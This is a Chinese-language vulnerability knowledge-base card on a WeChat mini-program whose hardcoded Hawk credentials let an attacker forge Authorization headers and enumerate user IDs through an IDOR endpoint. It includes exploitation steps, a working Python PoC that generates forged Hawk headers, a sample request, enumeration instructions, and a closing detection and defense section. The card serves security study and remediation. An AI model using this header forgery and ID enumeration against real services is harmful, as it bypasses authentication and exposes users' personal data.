---
id: web-generic-auth-miniprogram-hardcoded-hawk-authorization-forgery
title: 微信小程序硬编码 Hawk 凭据：伪造 Authorization 头枚举用户信息
type: scenario
domain: web
path: web/generic/auth
technique: miniprogram-hardcoded-hawk-auth-forgery
tags:
- miniprogram
- hawk
- authorization
- hmac
- hardcoded-secret
- auth-bypass
- idor
- enumeration
- api
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V83
  verified_at: '2026-11-05T17:47:34+08:00'
  notes: 已对照原文与图01-03核对：图01 Hawk header 构造函数包含 ts/nonce/method/resource/host/port 与 calculateMac，图02 exports.config 硬编码 apiUserName=wasx、apiPassword、apiKey，图03 hawk_forge.py 对 personalid front 000-999 共1000条逐条成功，与卡一致。未验证点：原文未展示密钥具体拼接顺序（卡内已要求以源码为准）；图03 仅见成功标记，未展示返回的敏感字段；未复跑 PoC；无组件版本，未设 affected_versions。
url: /docs/web/generic/auth/web-generic-auth-miniprogram-hardcoded-hawk-authorization-forgery/
draft: false
kb_aliases:
- Hawk 认证头伪造
- 小程序 Hawk 密钥泄露
- Authorization 头伪造
- memberid 枚举越权
- 微信小程序用户信息枚举
---

## 一句话结论

微信小程序把 Hawk 认证所需的 `id`、`key`（由硬编码的 apiKey 与 apiPassword 拼接）打包进 `app-service.js`；攻击者反编译小程序包提取密钥后，可按 Hawk 规范为任意请求重新计算 MAC、伪造 `Authorization` 头，并利用未做对象级鉴权的用户查询接口枚举 memberid，读取任意用户敏感信息。

## 原理

- Hawk 是 HMAC 类的 HTTP 认证方案：客户端用共享密钥对规范化字符串计算 MAC，服务端用同一密钥复算并比对。规范化字符串包含版本 `hawk.1.header`、时间戳、nonce、HTTP 方法、resource（path+query）、host、port，以及 body hash 与 ext（本例为空）。
- 该方案的安全性完全依赖密钥保密。小程序把 `apiUserName`、`apiPassword`、`apiKey` 明文写在 `app-service.js` 的配置对象中，并固定 `id="wasx"`；密钥由 apiKey 与 apiPassword 拼接得到。客户端代码可被反编译，等价于密钥公开。
- 有了密钥和公开算法，攻击者可以离线为任意 URL、任意 memberid 生成合法 Hawk 头，不需要官方客户端、抓包重放或服务端下发一次性凭证；时间戳与 nonce 都由客户端自由生成，服务端即便校验格式也无法区分伪造请求与正常请求。
- 认证只证明“请求来自持有共享密钥的客户端”，而小程序端所有用户共用同一个 `id`/密钥，服务端无法据 Hawk 头识别具体用户。若业务接口直接信任请求参数中的 memberid、未校验对象归属，则形成 IDOR：伪造头 + 修改 memberid 即可遍历他人数据。
- 枚举成功的根本原因是认证与授权脱节：Hawk 头只解决“调用方是否为合法客户端”，没有绑定“当前登录用户能访问哪个对象”；服务端缺少 per-user 会话与对象级权限检查。

## 触发条件

- 微信小程序包可获取并反编译（如 wxapkg 解包），认证密钥、id 与签名算法位于客户端 JS。
- 服务端只校验 Hawk MAC 的合法性，不校验设备/用户绑定，也没有额外的用户级 Token 或会话。
- 用户对象查询接口以 memberid 等客户端可控参数定位数据，未校验归属或权限。
- 接口对批量、顺序枚举无速率限制或异常检测。

## 利用步骤

1. 抓包确认 API 请求头：`Authorization: Hawk id="...",ts="...",nonce="...",mac="..."`，记录 method、URL、host、port。
2. 反编译小程序，在 `app-service.js` 等 bundle 中定位 Hawk `header` 构造函数与 `exports.config`，提取 `id`、apiKey、apiPassword 以及密钥拼接方式。
3. 复刻 Hawk 规范化字符串：`hawk.1.header`、时间戳、nonce、方法、resource（path+query）、host（小写）、port、空 body hash、空 ext，各字段以 `\n` 连接并以 `\n` 结尾。
4. 按源码中的新 nonce 生成方式（本例为 32 位十六进制）生成 nonce，用拼接后的密钥做 HMAC-SHA256，Base64 得到 mac，组装 `Hawk id="...",ts="...",nonce="...",mac="..."`。
5. 先用一个已知 memberid 验证生成的头与服务端响应；确认通过后，按前/后 3 位或 ±N 范围枚举 memberid，记录成功响应。
6. 在授权范围内抽查返回内容，确认是否包含姓名、手机号等敏感信息，并评估影响范围；测试后停止批量请求，避免对业务造成压力。

## PoC

Hawk 头生成（Python，参数需与目标源码一致）：

```python
import base64, hashlib, hmac, secrets, time
from urllib.parse import urlparse

def hawk_header(url, method, auth_id, key):
    u = urlparse(url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    resource = u.path + (("?" + u.query) if u.query else "")
    ts = int(time.time())
    nonce = secrets.token_hex(16)  # 原文为 32 位 hex
    normalized = "\n".join([
        "hawk.1.header", str(ts), nonce, method.upper(),
        resource, host.lower(), str(port), "", ""
    ]) + "\n"
    mac = base64.b64encode(
        hmac.new(key.encode(), normalized.encode(), hashlib.sha256).digest()
    ).decode()
    return f'Hawk id="{auth_id}",ts="{ts}",nonce="{nonce}",mac="{mac}"'

# key = apiKey + apiPassword（顺序以源码拼接为准）
print(hawk_header("https://api.example.com/api/user/InfoByid?memberid=147248",
                  "GET", "wasx", API_KEY + API_PASSWORD))
```

请求示例：

```http
GET /api/user/InfoByid?memberid=100248 HTTP/1.1
Host: api.example.com
Authorization: Hawk id="wasx",ts="<ts>",nonce="<32hex>",mac="<base64>"
```

枚举时将 `memberid` 按范围替换并重新生成头即可；原文实测 1000 个 ID 均返回成功（图 03），并称获取到用户敏感信息。

## 变体与关联

- 变体：其他 HMAC 类认证（AWS SigV4、自定义 `sign` 头、OAuth1 等）同样适用“客户端持有共享密钥 → 离线重签”；若密钥经服务端动态下发并绑定设备/会话，则不能直接伪造。
- 变体：密钥可能藏在明文配置、加密配置 + 硬编码解密密钥、WebAssembly 或云函数中；提取路径不同，结论一致。
- 关联：[[web-generic-auth-miniprogram-local-config-signature-forgery]]（小程序本地加密配置恢复 appKey 后伪造 HMAC 签名）、[[web-generic-auth-client-nonce-weak-sha1-signature-forgery]]（无密钥签名复现）；本卡差异在 Hawk 协议规范化字符串与共享客户端 id 导致的用户枚举。
- 关联：通用 IDOR/越权卡，用于说明签名合法不等于对象可访问。

## 检测与防御

- 密钥管理：不要把 Hawk key、apiKey/apiPassword 或可解密材料打进客户端；客户端改用服务端签发的短期、绑定用户/设备/会话的 token，密钥保存在 HSM/KMS。
- 认证设计：每个用户使用独立凭证或 OAuth/JWT，服务端从凭证解析当前用户身份，禁止所有客户端共用一个 `id`；校验时间戳窗口与 nonce 重放。
- 授权设计：用户查询接口必须做对象级鉴权，memberid 只能取自服务端会话，或显式校验目标对象归属；对敏感字段做最小化返回。
- 检测：同一 Hawk id 在短时间内查询大量连续/离散 memberid；签名合法但请求节奏脚本化、来源 IP/设备异常；大量 200 响应且响应体为用户资料。
- 缓解：对枚举行为限速、告警与封禁；对批量用户查询要求更高权限；定期审计小程序包中是否含硬编码密钥。
